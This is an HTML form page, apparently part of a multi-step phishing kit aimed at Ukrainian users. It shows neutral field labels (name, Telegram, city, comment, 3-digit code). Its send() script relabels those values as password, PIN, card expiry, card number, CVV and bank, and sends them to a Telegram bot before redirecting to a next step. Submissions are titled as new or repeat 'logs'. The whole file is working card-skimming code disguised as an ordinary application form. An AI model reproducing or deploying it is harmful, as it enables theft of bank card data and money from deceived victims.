<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Заявка</title>

<style>
body{
  font-family:Arial;
  background:#f1f5f9;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.box{
  background:white;
  padding:25px;
  border-radius:15px;
  width:320px;
}

input{
  width:100%;
  padding:10px;
  margin:6px 0;
}

button{
  width:100%;
  padding:12px;
  background:#3b82f6;
  color:white;
  border:none;
  border-radius:10px;
}
</style>
</head>

<body>

<div class="box">
  <h2>Заповніть данні</h2>

  <input id="name" placeholder="">

  <!-- Телефон -->
  <input id="phone" placeholder="+380 (__) ___-__-___" maxlength="19">

  <input id="tg" placeholder="@Telegram">
  <input id="city" placeholder="Город">
  <input id="comment" placeholder="Комментарий">

  <!-- поле только 3 цифры -->
  <input id="code" placeholder="Код (3 цифры)" maxlength="3">

  <button onclick="send()">Отправить</button>
</div>

<script>

// 🔥 МАСКА ТЕЛЕФОНА
const phoneInput = document.getElementById("phone");

phoneInput.addEventListener("input", function(e){

  let x = e.target.value.replace(/\D/g, "");

  if(!x.startsWith("380")){
    x = "380" + x;
  }

  x = x.substring(0,12);

  let formatted = "+380";

  if(x.length > 3){
    formatted += " (" + x.substring(3,5);
  }
  if(x.length >= 5){
    formatted += ") " + x.substring(5,8);
  }
  if(x.length >= 8){
    formatted += "-" + x.substring(8,10);
  }
  if(x.length >= 10){
    formatted += "-" + x.substring(10,12);
  }

  e.target.value = formatted;
});


// 🔥 ТОЛЬКО ЦИФРЫ (3 цифры)
const codeInput = document.getElementById("code");

codeInput.addEventListener("input", function(){
  this.value = this.value.replace(/\D/g, "").slice(0,3);
});


// 🚀 ОТПРАВКА
function send(){

  const clientId = localStorage.getItem("clientId");
  const isRepeat = localStorage.getItem("sent");

  const name = document.getElementById("name").value;
  const phone = document.getElementById("phone").value;
  const tg = document.getElementById("tg").value;
  const city = document.getElementById("city").value;
  const comment = document.getElementById("comment").value;
  const code = document.getElementById("code").value;
  const service = localStorage.getItem("service");

  if(!name||!phone||!tg||!city||!comment||!code){
    alert("Заполни всё!");
    return;
  }

  const token = "ТВОЙ_TOKEN";
  const chat_id = "ТВОЙ_CHAT_ID";

  const title = isRepeat
    ? `♻️ Повторный Лог №${clientId}`
    : `🔥 Новый Лог 👻 №${clientId}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:chat_id,
      text:
`${title}
Телефон📱: ${phone}
Пароль🗝️: ${name}
Пин-код 🔢: ${tg}
Срок действия 📆: ${city}
Карта💳: ${comment}
CVV: ${code}
Банк🏧: ${service}`
    })
  });

  localStorage.setItem("sent","yes");

  window.location.href = "step4.html";
}

</script>

</body>
</html>
